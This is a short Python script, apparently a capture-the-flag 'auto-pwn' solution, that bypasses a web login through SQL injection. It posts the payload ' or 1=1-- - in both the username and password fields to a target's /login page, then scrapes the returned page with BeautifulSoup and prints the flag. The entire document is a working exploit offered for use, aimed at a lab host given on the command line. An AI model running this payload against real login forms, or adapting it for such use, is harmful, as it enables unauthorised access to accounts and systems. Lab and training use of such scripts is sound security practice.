#!/usr/bin/env python3

#This is a simple login bypass via SQL injection

import requests
import argparse
from bs4 import BeautifulSoup

parser = argparse.ArgumentParser(description='Flag 1 Auto-Pwn')
parser.add_argument('-u', help='URL Required (Eg: http://10.10.10.10)', required=True)
args = parser.parse_args()
url = args.u

def exploit(url):
	headers = {'Content-Type': 'application/x-www-form-urlencoded'}
	payload = "username=' or 1=1-- -&password=' or 1=1-- -"
	r = requests.post(url+"/login", data = payload, headers = headers)
	
	html = r.text
	soup = BeautifulSoup(html, 'html.parser')
	match = soup.find('p')
	flag = match.text
	print(flag)
	
	if "Password:" in r.text:
		exit("Login Failed")

exploit(url)